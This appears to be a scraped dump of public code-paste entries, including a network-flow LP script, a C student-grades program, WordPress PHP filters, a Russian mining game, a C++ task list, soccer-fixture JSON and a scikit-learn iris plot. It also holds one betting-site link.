        for j in out_edges:
            A_ub[j, in_edges] = -1  # Flow out must equal flow in
            b_ub[j] = 0

# Solve the linear programming problem
result = linprog(c, A_ub=A_ub, b_ub=b_ub, method='highs')

# Update graph with flow values
flow_values = result.x
for i, (u, v) in enumerate(G.edges):
    G[u][v]['flow'] = flow_values[i]

# Visualize the solution graph with flow values
plt.figure(figsize=(10, 5))
nx.draw(G, pos, with_labels=True, node_size=1000, node_color='lightgreen', font_weight='bold')
edge_labels = {(u, v): f""{data['flow']:.2f}/{data['capacity']}"" for u, v, data in G.edges(data=True)}
nx.draw_networkx_edge_labels(G, pos, edge_labels=edge_labels, font_color='black')
plt.title(""Optimal Flow in the Network"")
plt.show()"
vHfepQy3,data856,TestGuy1,JSON,Friday 1st of March 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'b427a6ed07dfcee5ac56ae9cb2dd31a4d258d145a8d14ae80457810ce31b38e976a4bf21a73d7ed9e0477fafe0310fa554cd3a611c2b0bfc1aef296ed1a5d1de97c5099d4fcac73867e49859f562cb1c0910829ed7891e05dc93ba6c264c9df49c3c23ed68938ff3a1e6e50c6e7dbaf83d37c38281d5334d335df2223a3fc828',
  otherdata: [
    '74c5faa2661e82ae3b320f1d93a93099',
    '867ac9031112c16bc404f3f01091cd9f',
    '692d4cf2051afebecc5550e2b93f6429',
    '08e9f333115efaa035e5f7f1fc48aa36',
    'ccd9c0f2170590acd7009d8b732d13e7',
    'df73d1e4fb9737c5294ea3781d28ed62',
    '5063e6d0d1886f276fca9b41f5869584',
    '548f71cc45ff66afa4460432a9478c1b'
  ]
}"
cYvUfUas,sg,PIBogdanov,C,Friday 1st of March 2024 05:54:26 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <Windows.h>
#include <conio.h>

#pragma warning(disable : 4996)

#define MaxCharacters 100

#define MinGroupsCount 1
#define MaxGroupsCount 6

#define MinStudentsInTheGroupCount 2
#define MaxStudentsInTheGroupCount 30

#define MinSubjectsCount 2
#define MaxSubjectsCount 10

#define MinGrade 2.0f
#define MaxGrade 6.0f

/*
typedef struct
{
	char** subjectNames;
	
	unsigned short subjectsCount;
} Subject;

typedef struct
{
	Subject* subjects;

	float** grades;

	char** studentNames;

	char** facultyNumbers;
} Student;

typedef struct
{
	Student* students;

	unsigned short* studentsInTheGroupsCount;

	char** groupNames;

	unsigned short groupsCount;
} Group;

typedef struct
{
	Group* groups;

	char** majorNames;

	unsigned short majorsCount;
} Major;

typedef struct
{
	Major* majors;

	char** facultyNames;

	unsigned short facultiesCount;
} Faculty;

typedef struct 
{
	Faculty* faculties;

	char** universityNames;

	unsigned short universitiesCount;
} University;
*/

typedef struct
{
	float** grades;

	char** studentNames;

	char** facultyNumbers;

	char** subjectNames;

	unsigned short studentsInTheGroupCount;

	unsigned short subjectsCount;
} Student;

void inputStudentsInTheGroupCount(Student*);

void initializeStudentsInTheGroupCount(Student*, unsigned short);

void inputSubjectsCount(Student*);

void initializeSubjectsCount(Student*, unsigned short);

void inputSubjectNames(Student*);

void initialiseSubjectNames(Student*, char[][MaxSubjectsCount]);

void freeSubjectNames(Student*);

void inputStudentNames(Student*);

void inputStudentName(Student*, char[][MaxCharacters]);

void initialiseStudentNames(Student*, char[][MaxSubjectsCount]);

void freeStudentNames(Student*);

void inputFacultyNumbers(Student*);

void inputFacultyNumber(Student*, char[][MaxCharacters]);

void initialiseFacultyNumbers(Student*, char[][MaxCharacters]);

void freeFacultyNumbers(Student*);

void inputGrades(Student*);

void inputGrade(Student*, float[][MaxSubjectsCount]);

bool isValidGrade(float);

void initialiseGrades(Student*, float[][MaxSubjectsCount]);

void freeGrades(Student*);

void inputStudentInformation(Student*);

void printStudentInformation(Student*);

void initialiseStructMembers(Student*);

void freeStructMembers(Student*);

void removeNewlineCharacterIfItExists(char*);

void pressTheEnterKeyToContinue();

void isCursorVisible(bool);

void clearTheInputBufferIfNeededAndTheScreen(bool, bool);

void mainMenu(Student*);

void displayMenu(char*[], unsigned short, unsigned short);

void menuControls(Student*, unsigned short*, unsigned short, bool*);

void searchForAStudent(Student*);

bool isStudentPresentInTheGroup(Student*, char[], unsigned short*);

void printInformationAboutTheStudent(Student*, unsigned short);

int main()
{
	isCursorVisible(false);

	Student students;

	initialiseStructMembers(&students);

	clearTheInputBufferIfNeededAndTheScreen(false, true);

	printStudentInformation(&students);

	pressTheEnterKeyToContinue();

	mainMenu(&students);

	return 0;
}

void inputStudentsInTheGroupCount(Student* students)
{
	unsigned short studentsInTheGroupCount;

	inputStudentsInTheGroupCount:
	printf(""How many students are in the group? [%hu - %hu]\nStudents in the group count: "", MinStudentsInTheGroupCount, MaxStudentsInTheGroupCount);
	scanf(""%hu"", &studentsInTheGroupCount);

	if ( (studentsInTheGroupCount < MinStudentsInTheGroupCount) || (studentsInTheGroupCount > MaxStudentsInTheGroupCount) )
	{
		printf(""\n\nInvalid input!\n\n"");

		goto inputStudentsInTheGroupCount;
	}

	initializeStudentsInTheGroupCount(students, studentsInTheGroupCount);
}

void initializeStudentsInTheGroupCount(Student* students, unsigned short studentsInTheGroupCount)
{
	students->studentsInTheGroupCount = studentsInTheGroupCount;
}

void inputSubjectsCount(Student* students)
{
	unsigned short subjectsCount;

	inputSubjectsCount:
	printf(""How many subjects do the students have? [%hu - %hu]\nStudents in the group count: "", MinSubjectsCount, MaxSubjectsCount);
	scanf(""%hu"", &subjectsCount);

	if ( (subjectsCount < MinSubjectsCount) || (subjectsCount > MaxSubjectsCount) )
	{
		printf(""\n\nInvalid input!\n\n"");

		goto inputSubjectsCount;
	}

	initializeSubjectsCount(students, subjectsCount);
}

void initializeSubjectsCount(Student* students, unsigned short subjectsCount)
{
	students->subjectsCount = subjectsCount;
}

void inputSubjectNames(Student* students)
{
	printf(""Input the names of the subjects:\n\n\n"");

	char subjectNames[MaxSubjectsCount][MaxCharacters] = { { '\0' } };

	for (unsigned short i = 0; i < students->subjectsCount; i++)
	{
		printf(""Subject %hu: "", i + 1);

		while (fgets(subjectNames[i], MaxCharacters, stdin) == NULL)
		{
			printf(""\n\nToo many inputted characters! The max value of characters is %hu. Input a new subject name.\n\nSubject %hu: "", MaxCharacters, i + 1);
		}

		removeNewlineCharacterIfItExists(subjectNames[i]);
	}

	initialiseSubjectNames(students, subjectNames);
}

void initialiseSubjectNames(Student* students, char subjectNames[][MaxCharacters])
{
	students->subjectNames = malloc(students->subjectsCount * sizeof(char*));

	for (size_t i = 0; i < students->subjectsCount; i++)
	{
		students->subjectNames[i] = strdup(subjectNames[i]);
	}
}

void freeSubjectNames(Student* students)
{
	for (size_t i = 0; i < students->subjectsCount; i++)
	{
		free(students->subjectNames[i]);
	}

	free(students->subjectNames);
}

void inputStudentNames(Student* students)
{
	printf(""Input the names of the students:\n\n\n"");

	char studentNames[MaxStudentsInTheGroupCount][MaxCharacters] = { { '\0' } };

	for (unsigned short i = 0; i < students->studentsInTheGroupCount; i++)
	{
		printf(""Student %hu: \n"", i + 1);

		printf(""Name: "");

		while (fgets(studentNames[i], MaxCharacters, stdin) == NULL)
		{
			printf(""\n\nToo many inputted characters! The max value of characters is %hu. Input a new student name.\n\nName: "", MaxCharacters);
		}

		removeNewlineCharacterIfItExists(studentNames[i]);

		printf(""\n\n"");
	}

	initialiseStudentNames(students, studentNames);
}

void inputStudentName(Student* students, char studentNames[][MaxCharacters])
{
	for (unsigned short i = 0; i < students->studentsInTheGroupCount; i++)
	{
		if (!strcmp(studentNames[i], ""\0""))
		{
			while (fgets(studentNames[i], MaxCharacters, stdin) == NULL)
			{
				printf(""\n\nToo many inputted characters! The max value of characters is %hu. Input a new student name.\n\nName: "", MaxCharacters);
			}

			removeNewlineCharacterIfItExists(studentNames[i]);

			return;
		}
	}
}

void initialiseStudentNames(Student* students, char studentNames[][MaxCharacters])
{
	students->studentNames = malloc(students->studentsInTheGroupCount * sizeof(char*));

	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		students->studentNames[i] = strdup(studentNames[i]);
	}
}

void freeStudentNames(Student* students)
{
	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		free(students->studentNames[i]);
	}

	free(students->studentNames);
}

void inputFacultyNumbers(Student* students)
{
	printf(""Input the faculty numbers of the students:\n\n\n"");

	char facultyNumbers[MaxStudentsInTheGroupCount][MaxCharacters] = { { '\0' } };

	for (unsigned short i = 0; i < students->studentsInTheGroupCount; i++)
	{
		printf(""Student %hu: \n"", i + 1);

		printf(""Name: %s\n"", students->studentNames[i]);

		printf(""Faculty number: "");

		while (fgets(facultyNumbers[i], MaxCharacters, stdin) == NULL)
		{
			printf(""\n\nToo many inputted characters! The max value of characters is %hu. Input a faculty number.\n\nFaculty number: "", MaxCharacters);
		}

		removeNewlineCharacterIfItExists(facultyNumbers[i]);

		printf(""\n\n"");
	}

	initialiseFacultyNumbers(students, facultyNumbers);
}

void inputFacultyNumber(Student* students, char facultyNumbers[][MaxCharacters])
{
	for (unsigned short i = 0; i < students->studentsInTheGroupCount; i++)
	{
		if (!strcmp(facultyNumbers[i], ""\0""))
		{
			while (fgets(facultyNumbers[i], MaxCharacters, stdin) == NULL)
			{
				printf(""\n\nToo many inputted characters! The max value of characters is %hu. Input a faculty number.\n\nFaculty number: "", MaxCharacters);
			}

			removeNewlineCharacterIfItExists(facultyNumbers[i]);

			return;
		}
	}
}

void initialiseFacultyNumbers(Student* students, char facultyNumbers[][MaxCharacters])
{
	students->facultyNumbers = malloc(students->studentsInTheGroupCount * sizeof(char*));

	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		students->facultyNumbers[i] = strdup(facultyNumbers[i]);
	}
}

void freeFacultyNumbers(Student* students)
{
	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		free(students->facultyNumbers[i]);
	}

	free(students->facultyNumbers);
}

void inputGrades(Student* students)
{
	printf(""Input the students' grades on each subject:\n\n\n"");

	float grades[MaxStudentsInTheGroupCount][MaxSubjectsCount];

	for (unsigned short i = 0; i < students->studentsInTheGroupCount; i++)
	{
		printf(""Student %hu: \n"", i + 1);

		printf(""Name: %s\n"", students->studentNames[i]);

		printf(""Faculty number: %s\n"", students->facultyNumbers[i]);

		for (size_t j = 0; j < students->subjectsCount; j++)
		{
			inputAGrade:
			printf(""%s: "", students->subjectNames[j]);
			scanf(""%f"", &grades[i][j]);

			if (!isValidGrade(grades[i][j]))
			{
				printf(""\n\nIvalid grade! Input a new one.\n\n"");

				goto inputAGrade;
			}
		}

		printf(""\n\n"");
	}

	initialiseGrades(students, grades);
}

void inputGrade(Student* students, float grades[][MaxSubjectsCount])
{
	for (unsigned short i = 0; i < students->studentsInTheGroupCount; i++)
	{
		for (size_t j = 0; j < students->subjectsCount; j++)
		{
			if (grades[i][j] == 0.0f)
			{
				inputAGrade:
				scanf(""%f"", &grades[i][j]);

				if (!isValidGrade(grades[i][j]))
				{
					printf(""\n\nIvalid grade! Input a new one.\n\n%s: "", students->subjectNames[j]);

					goto inputAGrade;
				}

				return;
			}
		}
	}
}

bool isValidGrade(float grade)
{
	return (grade >= MinGrade) && (grade <= MaxGrade);
}

void initialiseGrades(Student* students, float grades[][MaxSubjectsCount])
{
	students->grades = malloc(students->studentsInTheGroupCount * sizeof(float*));

	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		students->grades[i] = malloc(students->subjectsCount * sizeof(float));

		memcpy(students->grades[i], grades[i], students->subjectsCount * sizeof(float));
	}
}

void freeGrades(Student* students)
{
	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		free(students->grades[i]);
	}

	free(students->grades);
}

void inputStudentInformation(Student* students)
{
	printf(""Input information for each student in the group:\n\n\n"");

	char studentNames[MaxStudentsInTheGroupCount][MaxCharacters] = { { '\0' } };

	char facultyNumbers[MaxStudentsInTheGroupCount][MaxCharacters] = { { '\0' } };

	float grades[MaxStudentsInTheGroupCount][MaxSubjectsCount] = { { 0.0f } };

	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		printf(""Student %llu:\n\n"", i + 1);

		printf(""Name: "");
		inputStudentName(students, studentNames);

		printf(""Faculty number: "");
		inputFacultyNumber(students, facultyNumbers);

		for (size_t j = 0; j < students->subjectsCount; j++)
		{
			printf(""%s: "", students->subjectNames[j]);
			inputGrade(students, grades);
		}

		printf(""\n\n"");

		clearTheInputBufferIfNeededAndTheScreen(true, false);
	}

	initialiseStudentNames(students, studentNames);

	initialiseFacultyNumbers(students, facultyNumbers);

	initialiseGrades(students, grades);
}

void printStudentInformation(Student* students)
{
	clearTheInputBufferIfNeededAndTheScreen(false, true);

	printf(""Group information:\n\n\n"");

	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		printf(""Student %llu:\n\n"", i + 1);

		printf(""Name: %s\n"", students->studentNames[i]);

		printf(""Faculty number: %s\n"", students->facultyNumbers[i]);

		for (size_t j = 0; j < students->subjectsCount; j++)
		{
			printf(""%s: %.2f\n"", students->subjectNames[j], students->grades[i][j]);
		}

		printf(""\n\n"");
	}
}

void initialiseStructMembers(Student* students)
{
	inputStudentsInTheGroupCount(students);

	clearTheInputBufferIfNeededAndTheScreen(true, true);

	inputSubjectsCount(students);
	
	clearTheInputBufferIfNeededAndTheScreen(true, true);

	inputSubjectNames(students);

	clearTheInputBufferIfNeededAndTheScreen(false, true);

	if (false)
	{
		inputStudentNames(students);

		clearTheInputBufferIfNeededAndTheScreen(false, true);

		inputFacultyNumbers(students);

		clearTheInputBufferIfNeededAndTheScreen(false, true);

		inputGrades(students);
	}
	
	else
	{
		inputStudentInformation(students);
	}
}

void freeStructMembers(Student* students)
{
	freeSubjectNames(students);
	
	freeStudentNames(students);

	freeFacultyNumbers(students);

	freeGrades(students);
}

void removeNewlineCharacterIfItExists(char* string)
{
	size_t stringLength = strlen(string);

	if ( (stringLength > 0) && (string[stringLength - 1] == '\n') )
	{
		string[stringLength - 1] = '\0';
	}
}

// Function, which waits the user to press the ""ENTER / RETURN"" key

void pressTheEnterKeyToContinue()
{
	printf(""\n\n\nPress \""ENTER\"" to go back to the Main Menu"");

	while (_getch() != 13); // ""\r"" - The ""ENTER / RETURN"" key
}

// Function, which decides to either turn on or turn off the cursor by giving a bool value either ""true / 1"" or ""false / 0""

void isCursorVisible(bool isVisible)
{
	HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);

	CONSOLE_CURSOR_INFO cursorInfo;
	GetConsoleCursorInfo(consoleHandle, &cursorInfo);

	cursorInfo.bVisible = isVisible;
	SetConsoleCursorInfo(consoleHandle, &cursorInfo);
}

// Function, which clears the input buffer from the newline character and clears the screen

void clearTheInputBufferIfNeededAndTheScreen(bool clearBuffer, bool clearScreen)
{
	if (clearBuffer) 
	{
		char character = getchar();

		while ( (character != '\n') && (character != EOF) );
	}

	if (clearScreen)
	{
		system(""cls"");
	}
}

void mainMenu(Student* students)
{
	char* options[] = { { ""1. Search for a student"" }, { ""2. Option 2"" }, { ""3. Option 3"" }, { ""4. Exit"" } };

	unsigned short totalOptions = sizeof(options) / sizeof(options[0]);

	unsigned short selectedOption = 1;

	bool isExit = false;

	while (!isExit)
	{
		system(""cls"");

		displayMenu(options, selectedOption, totalOptions);

		menuControls(students, &selectedOption, totalOptions, &isExit);
	}
}

void displayMenu(char* options[], unsigned short selectedOption, unsigned short totalOptions)
{
	printf(""          Menu:\n\n"");

	for (size_t i = 0; i < totalOptions; i++)
	{
		printf(""%s%s\n"", (selectedOption == (i + 1)) ? ""--> "" : ""    "", options[i]);
	}
}

void menuControls(Student* students, unsigned short* selectedOption, unsigned short totalOptions, bool* isExit)
{
	char key = getch();

	switch (key)
	{
		case 'W': case 'w': case 72: // Up arrow key
		*selectedOption = (*selectedOption > 1) ? *selectedOption - 1 : totalOptions; break;

		case 'S': case 's': case 80: // Down arrow key
		*selectedOption = (*selectedOption < totalOptions) ? *selectedOption + 1 : 1; break;

		case 13: // Enter key
		switch (*selectedOption)
		{
			case 1: searchForAStudent(students); pressTheEnterKeyToContinue(); break;

			case 2: break;

			case 3: break;

			case 4: freeStructMembers(students); *isExit = true;
		}

		break;
	}
}

void searchForAStudent(Student* students)
{
	clearTheInputBufferIfNeededAndTheScreen(false, true);

	char studentName[MaxCharacters];

	unsigned short indexOfTheStudent = 0;

	inputAStudentName:

	printf(""Input a name of a student to search: "");

	while (fgets(studentName, MaxCharacters, stdin) == NULL)
	{
		printf(""\n\nToo many inputted characters! The max value of characters is %hu. Input a new name.\n\nInput a name of a student to search: "", MaxCharacters);
	}

	removeNewlineCharacterIfItExists(studentName);

	clearTheInputBufferIfNeededAndTheScreen(false, true);

	if (!isStudentPresentInTheGroup(students, studentName, &indexOfTheStudent))
	{
		printf(""There's no student with this name in this group.\n\n\n"");

		goto inputAStudentName;
	}

	printf(""Student with this name has been found.\n\n\n"");

	printInformationAboutTheStudent(students, indexOfTheStudent);
}

bool isStudentPresentInTheGroup(Student* students, char studentName[], unsigned short* indexOfTheStudent)
{
	for (size_t i = 0; i < students->studentsInTheGroupCount; i++)
	{
		if (!strcmp(students->studentNames[i], studentName))
		{
			*indexOfTheStudent = i;

			return true;
		}
	}

	return false;
}

void printInformationAboutTheStudent(Student* students, unsigned short indexOfTheStudent)
{
	printf(""Student %llu:\n\n"", indexOfTheStudent + 1);

	printf(""Name: %s\n"", students->studentNames[indexOfTheStudent]);

	printf(""Faculty number: %s\n"", students->facultyNumbers[indexOfTheStudent]);

	for (size_t j = 0; j < students->subjectsCount; j++)
	{
		printf(""%s: %.2f\n"", students->subjectNames[j], students->grades[indexOfTheStudent][j]);
	}
}"
06ZtXKx8,Add ellipsis [...] on the post archive,fahimmurshed,PHP,Friday 1st of March 2024 05:53:07 AM CDT,"/**
 * Theme's overridden of excerpt function
 */
function astra_the_excerpt() {

	$excerpt_type = apply_filters( 'astra_excerpt_type', astra_get_option( 'blog-post-content' ) );

	do_action( 'astra_the_excerpt_before', $excerpt_type );
	?>
		<div class=""ast-excerpt-container ast-blog-single-element"">
			<?php
			if ( 'full-content' === $excerpt_type ) {
				the_content();
			} else {
				the_excerpt();
			}
			?>
		</div>
	<?php

	do_action( 'astra_the_excerpt_after', $excerpt_type );
}

/**
 * Filter to change the excerpt more string to dots ...
 */
add_filter( 'excerpt_more', 'extended_excerpt_more' );
function extended_excerpt_more( $more ) {
	return '[...]';
}"
hZCyLaFG,tool,nq1s788,Python,Friday 1st of March 2024 05:31:31 AM CDT,"from random import choices


class Tool:
    rarity = 'Обычная'
    durability = 100
    ratio = 2
    hardness = [('Обычная', 2), ('Редкая', 1.25), ('Легендарная', 0.65)]
    probability = [50, 35, 15]

    def get_probability(self):
        for i in range(len(self.hardness)):
            if self.hardness[i][0] == self.rarity:
                return self.probability[i]

    def get_new_tool(self):
        self.rarity, self.ratio = choices(self.hardness, weights=self.probability)
        self.durability = 100


class Pickaxe(Tool):
    metal_hardness = 25

    def mine_metal(self):
        self.durability -= self.ratio * self.metal_hardness


class Shovel(Tool):
    dirt_hardness = 15

    def clear_dirt(self):
        self.durability -= self.ratio * self.dirt_hardness


def choose_option():
    print('Выберите действие:')
    print('1. добывать киркой;')
    print('2. копать лопатой;')
    print('3. статистика;')
    print('4. завершить игру.')
    print()
    return input('Ответ: ')


def start():
    events = (['жила', 'завал'], [20, 80])
    metal = 0
    dirt = 0
    pickaxe = Pickaxe()
    shovel = Shovel()
    print('Вы начинаете игру')
    print('Инструменты:')
    print('- ""' + pickaxe.rarity + '"" кирка', str(pickaxe.durability) + '/100')
    print('- ""' + shovel.rarity + '"" лопата', str(shovel.durability) + '/100')
    print()
    event = choices(events[0], weights=events[1])
    print('Герою попадается', event + '!')
    request = choose_option()
    while request != '4':
        if request == '1':
            if event == 'завал':
                print('Завалы нельзя расчищать киркой!')
                request = choose_option()
                continue
            pickaxe.mine_metal()
            if pickaxe.durability < 0:
                print('Кирка не выдержала, сломалась, металл не добыт')
                print('""' + pickaxe.rarity + '"" кирка разрушается!')
                pickaxe.get_new_tool()
                print('Герой достает из сумки ""' + pickaxe.rarity + '"" кирка с вероятностью', str(pickaxe.get_probability()) + '%')
            else:
                metal += 1
                print('Герой добывает 1 металл, Кирка', str(pickaxe.durability) + '/100')
"
5RZWeeE1,Soccer Prediction Betting Tips 01032024,livebetpro,PHP,Friday 1st of March 2024 05:22:49 AM CDT,https://www.livebetpro.com/soccer-prediction-betting-tips-01032024/
sYdmZmmz,Untitled,35657,C++,Friday 1st of March 2024 05:19:08 AM CDT,"#include <iostream>
using namespace std;
struct date_time {
	int day;
	int month;
	int year;
	int hour;
	int minutes;
	int seconds;
};
struct cases {
	char title[100];
	char description[100];
	date_time dt;
	int priority;
};
struct list_cases {
	cases store[100];//хранилище
	int cases_number = 0;//текущее количество элементов хранилища
};
//Добавить задание(+)
void add_cases(list_cases& some_list, const char* title, const char* description, const date_time dt, const int priority) {
	if (some_list.cases_number == 100) {
		cout << ""Задание не может быть добавлено"" << endl;
		return;
	}
	strcpy(some_list.store[some_list.cases_number].title, title);
	strcpy(some_list.store[some_list.cases_number].description, description);
	some_list.store[some_list.cases_number].dt = dt;
	some_list.store[some_list.cases_number].priority = priority;
	some_list.cases_number++;
}
//Удалить задание(+)
void del_case(list_cases& some_list, const char* title) {
	for (int i = 0; i < some_list.cases_number; i++) {
		if (!strcmp(some_list.store[i].title, title)) {
			for (int j = i; j < some_list.cases_number - 1; j++) {
				some_list.store[j] = some_list.store[j + 1];
			}
			some_list.cases_number--;
		}
	}
}

//Найти задание по названию(+)
void find_case_by_title(struct list_cases& some_list, const char* title) {
	for (int i = 0; i < some_list.cases_number; i++) {
		if (!strcmp(some_list.store[i].title, title)) {
			cout << some_list.store[i].title << "", описание - "" << some_list.store[i].description << "", дата - "" << some_list.store[i].dt.day << '.' << some_list.store[i].dt.month << '.' << some_list.store[i].dt.year << "" "" << "", время - "" << some_list.store[i].dt.hour << "":"" << some_list.store[i].dt.minutes << "":"" << some_list.store[i].dt.seconds << "", важность - "" << some_list.store[i].priority << endl;
		}
	}
	cout << endl;
}
//по важности(+)
void find_case_by_priority(struct list_cases& some_list, const int priority) {
	int max = 0, num;
	for (int i = 0; i < some_list.cases_number; i++) {
		if (some_list.store[i].priority == priority) {
			if (some_list.store[i].priority > max) {
				max = some_list.store[i].priority;
				num = i;
			}

			cout << some_list.store[num].title << "", описание - "" << some_list.store[num].description << "", дата - "" << some_list.store[num].dt.day << '.' << some_list.store[num].dt.month << '.' << some_list.store[num].dt.year << "" "" << "", время - "" << some_list.store[num].dt.hour << "":"" << some_list.store[num].dt.minutes << "":"" << some_list.store[num].dt.seconds << "", важность - "" << some_list.store[num].priority << endl;
		}
	}
}
//по дате и времени(+) ура!!! заработало))
void find_case_by_dt(list_cases& some_list, struct date_time d) {
	for (int i = 0; i < some_list.cases_number; i++) {
		if (some_list.store[i].dt.day == d.day && some_list.store[i].dt.month == d.month && some_list.store[i].dt.year == d.year || some_list.store[i].dt.hour == d.hour && some_list.store[i].dt.minutes == d.minutes && some_list.store[i].dt.seconds == d.seconds) {
			cout << some_list.store[i].title << "", описание - "" << some_list.store[i].description << "", дата - "" << some_list.store[i].dt.day << '.' << some_list.store[i].dt.month << '.' << some_list.store[i].dt.year << "" "" << "", время - "" << some_list.store[i].dt.hour << "":"" << some_list.store[i].dt.minutes << "":"" << some_list.store[i].dt.seconds << "", важность - "" << some_list.store[i].priority << endl;
		}
	}
}
//по описанию(+)
void find_case_by_description(struct list_cases& some_list, const char* description) {
	for (int i = 0; i < some_list.cases_number; i++) {
		if (!strcmp(some_list.store[i].description, description)) {
			cout << some_list.store[i].title << "", описание - "" << some_list.store[i].description << "", дата - "" << some_list.store[i].dt.day << '.' << some_list.store[i].dt.month << '.' << some_list.store[i].dt.year << "" "" << "", время - "" << some_list.store[i].dt.hour << "":"" << some_list.store[i].dt.minutes << "":"" << some_list.store[i].dt.seconds << "", важность - "" << some_list.store[i].priority << endl;
		}
	}
	cout << endl;
};
//редактировать задание(работает)
void edit_case(list_cases& some_list, const char* title, int index, int value) {
	for (int i = 0; i < some_list.cases_number; i++) {
		if (!strcmp(some_list.store[i].title, title)) {
			if (index < 0 || index > some_list.cases_number) {
				cout << ""Индекс некорректный"" << endl;
				return;
			}
			for (int i = 0; i < some_list.cases_number; i++) {
				some_list.store[index].priority = value;
			}
		}
	}
}

//сортировка в порядке возрастания приоритета (для сортировки в порядке убывания поменять знак в if)
void sort_by_priority(list_cases& some_list) {
	cases temp;
	for (int i = 0; i < some_list.cases_number - 1; i++) {
		for (int j = i + 1; j < some_list.cases_number; j++) {
			if (some_list.store[j].priority < some_list.store[i].priority) {
				temp = some_list.store[i];
				some_list.store[i] = some_list.store[j];
				some_list.store[j] = temp;
			}
		}
	}
}


//Вывели все задания
void print(const list_cases& some_list) {
	for (int i = 0; i < some_list.cases_number; i++) {
		cout << some_list.store[i].title << "", описание - "" << some_list.store[i].description << "", дата - "" << some_list.store[i].dt.day << '.' << some_list.store[i].dt.month << '.' << some_list.store[i].dt.year << "" "" << "", время - "" << some_list.store[i].dt.hour << "":"" << some_list.store[i].dt.minutes << "":"" << some_list.store[i].dt.seconds << "", важность - "" << some_list.store[i].priority << endl;
	};
	cout << endl;
}
int main()
{
	setlocale(LC_ALL, ""ru"");
	list_cases my_cases;
	add_cases(my_cases, ""Case1"", ""Description1"", { 01,02,2024,11,00,00 }, 3);
	add_cases(my_cases, ""Case2"", ""Description2"", { 02,02,2024,12,00,00 }, 4);
	add_cases(my_cases, ""Case3"", ""Description3"", { 03,02,2024,13,00,00 }, 5);
	add_cases(my_cases, ""Case4"", ""Description4"", { 04,02,2024,14,00,00 }, 2);
	add_cases(my_cases, ""Case5"", ""Description5"", { 05,02,2024,15,00,00 }, 1);

	print(my_cases);
	//del_case(my_cases, ""Case2"");//Удалить Case2
	//print(my_cases);//Вывод после удаления Case2
	//find_case_by_title(my_cases, ""Case4"");
	//find_case_by_priority(my_cases, 5);
	//find_case_by_description(my_cases, ""Description4"");
	//find_case_by_dt(my_cases, { 03,02,2024, 13,0,0});//поиск по дате и времени
	//edit_case(my_cases, ""Case2"", 3, 444);//для int
	sort_by_priority(my_cases);
	print(my_cases);
	//cout << endl;
	//print(my_cases);

}


"
BDxSGGnj,Drag & Drop File Upload - Append Folder,CodeDropz,PHP,Friday 1st of March 2024 05:18:17 AM CDT,"add_filter('dndmfu_cf7_upload_folder', function( $folder ){
	if( $folder ){
		if( isset( $_POST['posted_data'] ) ){
			wp_parse_str( $_POST['posted_data'], $data );
			return ( isset( $data['company-name'] ) ? $folder .'-'. $data['company-name'] : $folder );
		}
		return $folder;
	}
}, 10 , 1);"
xaZxCKiG,Matchs (Soccer Point),AhmadXploit,Dart,Friday 1st of March 2024 05:01:20 AM CDT,"[
	{
      ""week"": ""Week 10"",
      ""image1"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1709234264/Soccer%20Point/Premier%20League/mc_wmfvab.png"",
      ""team1"": ""Man City"",
      ""image2"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1709234285/Soccer%20Point/Premier%20League/mu_mb8kn8.png"",
      ""team2"": ""Barcelona"",
      ""date"": ""8 Oct"",
      ""time"": ""06:00""
    },
    {
      ""week"": ""Week 11"",
      ""image1"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1709234264/Soccer%20Point/Premier%20League/mc_wmfvab.png"",
      ""team1"": ""Man City"",
      ""image2"": ""https://res.cloudinary.com/dybvjvrib/image/upload/v1709234285/Soccer%20Point/Premier%20League/mu_mb8kn8.png"",
      ""team2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    }
]"
SwXgGmSg,ml_plot_iris.py,rric,Python,Friday 1st of March 2024 04:37:03 AM CDT,"# https://scikit-learn.org/0.18/auto_examples/svm/plot_iris.html
# Copyright 2010-2016, scikit-learn developers
# Copyright 2022 Roland Richter
# used and released under BSD 3-Clause License

import numpy as np
import matplotlib.pyplot as plt
from matplotlib.colors import ListedColormap

from sklearn import datasets
from sklearn.neighbors import KNeighborsClassifier
from sklearn.linear_model import Perceptron
from sklearn.tree import DecisionTreeClassifier
from sklearn import svm
from sklearn.neural_network import MLPClassifier

# import iris dataset, but use only two features
features = [0, 2]
iris = datasets.load_iris()
X = iris.data[:, features]
labels = iris.target

# create instances of methods, and fit data
nbrs = KNeighborsClassifier(n_neighbors=5).fit(X, labels)
dtree = DecisionTreeClassifier().fit(X, labels)
ptron = Perceptron(shuffle=True).fit(X, labels)
svm_lin = svm.LinearSVC(C=1.0).fit(X, labels)
svm_rbf = svm.SVC(kernel=""rbf"", gamma=0.7, C=1.0).fit(X, labels)
nn_mlp = MLPClassifier(
    shuffle=True, hidden_layer_sizes=(20,), activation=""tanh"", random_state=42
).fit(X, labels)

# create a mesh to plot in
h = 0.02  # step size in the mesh
x_min, x_max = X[:, 0].min() - 0.3, X[:, 0].max() + 0.3
y_min, y_max = X[:, 1].min() - 0.3, X[:, 1].max() + 0.3
xx, yy = np.meshgrid(np.arange(x_min, x_max, h), np.arange(y_min, y_max, h))

# title for the plots
titles = [
    ""k nearest neighbours"",
    ""decision tree"",
    ""perceptron"",
    ""SVM with linear kernel"",
    ""SVM with RBF kernel"",
    ""multi-layer perceptron"",
]

colormap = ListedColormap([""red"", ""green"", ""blue""])

for i, clf in enumerate((nbrs, dtree, ptron, svm_lin, svm_rbf, nn_mlp)):
    # Plot the decision boundary. For that, we will assign a color to each
    # point in the mesh [x_min, x_max]x[y_min, y_max].
    plt.subplot(2, 3, i + 1)
    plt.subplots_adjust(wspace=0.3, hspace=0.4)

    Z = clf.predict(np.c_[xx.ravel(), yy.ravel()])

    # put the result into a color plot
